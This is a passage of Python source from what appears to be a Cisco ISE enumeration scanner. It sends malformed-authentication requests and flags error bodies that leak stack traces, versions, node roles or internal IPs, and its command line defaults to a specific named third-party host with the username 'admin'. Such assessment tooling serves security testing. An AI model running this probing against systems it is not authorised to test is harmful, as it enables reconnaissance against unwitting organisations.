        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(8192)
            except Exception:
                pass
            return _e.code, _b, dict(_e.headers) if hasattr(_e, 'headers') else {}
        except Exception:
            return None, b'', {}

    _seen_titles: set = set()

    for _path, _accept, _svc_label in _endpoints:
        for _hdr_name, _hdr_val in _malformed_creds:
            _st, _body, _hdrs = _fetch(_path, _accept, {_hdr_name: _hdr_val})
            if _st is None or not _body:
                continue
            _txt = _body.decode(errors='replace')

            _parsed = {}
            try:
                _parsed = json.loads(_txt)
            except Exception:
                pass

            _code_val = (
                _parsed.get('code') or _parsed.get('ERSResponse', {}).get('status', {}).get('code') if isinstance(_parsed, dict) else None
            )
            _msg_val = (
                _parsed.get('message') or _parsed.get('ERSResponse', {}).get('status', {}).get('message') if isinstance(_parsed, dict) else None
            )
            _desc_val = (
                _parsed.get('description') or _parsed.get('ERSResponse', {}).get('status', {}).get('description') if isinstance(_parsed, dict) else None
            )
            _type_val = (
                _parsed.get('type') or _parsed.get('error_type') or _parsed.get('errorType') if isinstance(_parsed, dict) else None
            )

            _subsystem = _classify_subsystem(_st, _svc_label)

            _java_hits = _java_exc_re.findall(_txt)
            if _java_hits:
                _title = 'ISE_ERROR_JAVA_STACKTRACE_LEAK'
                if _title not in _seen_titles:
                    _seen_titles.add(_title)
                    findings.append({
                        'severity': 'CRITICAL',
                        'title': _title,
                        'detail': (
                            f'Malformed-auth request to {_path} ({_hdr_name}) on '
                            f'{host}:{port} returned HTTP {_st} with Java exception '
                            f'or class name in error body — subsystem {_subsystem}. '
                            f'Exceptions: {_java_hits[:3]}. '
                            f'error fields: code={_code_val} msg={str(_msg_val)[:80]} '
                            f'type={_type_val}. Preview: {_txt[:300]}'
                        ),
                        'host': host,
                        'port': port,
                    })

            _ver_hits = _version_re.findall(_txt)
            if _ver_hits:
                _title = f'ISE_ERROR_VERSION_DISCLOSURE_{_svc_label}'
                if _title not in _seen_titles:
                    _seen_titles.add(_title)
                    findings.append({
                        'severity': 'HIGH',
                        'title': _title,
                        'detail': (
                            f'Malformed-auth request to {_path} ({_hdr_name}) on '
                            f'{host}:{port} returned HTTP {_st} with ISE version '
                            f'string in error body — subsystem {_subsystem}. '
                            f'Version strings: {_ver_hits[:3]}. '
                            f'error fields: code={_code_val} msg={str(_msg_val)[:80]}. '
                            f'Preview: {_txt[:300]}'
                        ),
                        'host': host,
                        'port': port,
                    })

            _role_hits = _role_re.findall(_txt)
            if _role_hits:
                _title = f'ISE_ERROR_NODE_ROLE_DISCLOSURE_{_svc_label}'
                if _title not in _seen_titles:
                    _seen_titles.add(_title)
                    findings.append({
                        'severity': 'HIGH',
                        'title': _title,
                        'detail': (
                            f'Malformed-auth request to {_path} ({_hdr_name}) on '
                            f'{host}:{port} returned HTTP {_st} with ISE node role '
                            f'(PAN/PSN/MnT) in error body — subsystem {_subsystem}. '
                            f'Role indicators: {_role_hits[:3]}. '
                            f'error fields: code={_code_val} type={_type_val}. '
                            f'Preview: {_txt[:300]}'
                        ),
                        'host': host,
                        'port': port,
                    })

            _ip_hits = _internal_ip_re.findall(_txt)
            if _ip_hits:
                _title = f'ISE_ERROR_INTERNAL_IP_DISCLOSURE_{_svc_label}'
                if _title not in _seen_titles:
                    _seen_titles.add(_title)
                    findings.append({
                        'severity': 'HIGH',
                        'title': _title,
                        'detail': (
                            f'Malformed-auth request to {_path} ({_hdr_name}) on '
                            f'{host}:{port} returned HTTP {_st} with RFC-1918 '
                            f'address in error context — subsystem {_subsystem}. '
                            f'IPs: {_ip_hits[:5]}. '
                            f'error fields: code={_code_val} desc={str(_desc_val)[:80]}. '
                            f'Preview: {_txt[:300]}'
                        ),
                        'host': host,
                        'port': port,
                    })

            if _code_val is not None or _type_val is not None:
                _title = f'ISE_ERROR_STRUCTURED_BODY_{_subsystem}'
                if _title not in _seen_titles:
                    _seen_titles.add(_title)
                    findings.append({
                        'severity': 'LOW',
                        'title': _title,
                        'detail': (
                            f'Malformed-auth request to {_path} ({_hdr_name}) on '
                            f'{host}:{port} returned HTTP {_st} with structured '
                            f'error body containing typed error fields — '
                            f'subsystem {_subsystem}. '
                            f'code={_code_val} type={_type_val} '
                            f'message={str(_msg_val)[:80]} '
                            f'description={str(_desc_val)[:80]}'
                        ),
                        'host': host,
                        'port': port,
                    })

    if not findings:
        findings.append({
            'severity': 'INFO',
            'title': 'ISE_ERROR_FINGERPRINT_OPAQUE',
            'detail': (
                f'Malformed-auth requests across 8 endpoints on {host}:{port} '
                f'returned no structured error fields, no Java exception traces, '
                f'no version or role disclosure, no internal IP in error context — '
                f'ISE error bodies are opaque to typed-error fingerprinting.'
            ),
            'host': host,
            'port': port,
        })

    return findings


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
if __name__ == '__main__':
    import sys
    host = sys.argv[1] if len(sys.argv) > 1 else 'ise.macstadium.com'
    user = sys.argv[2] if len(sys.argv) > 2 else 'admin'
    pw   = sys.argv[3] if len(sys.argv) > 3 else ''
    enum = ISEEnumerator(host, username=user, password=pw)
    out  = enum.run()
    print(json.dumps(out, indent=2, default=str))
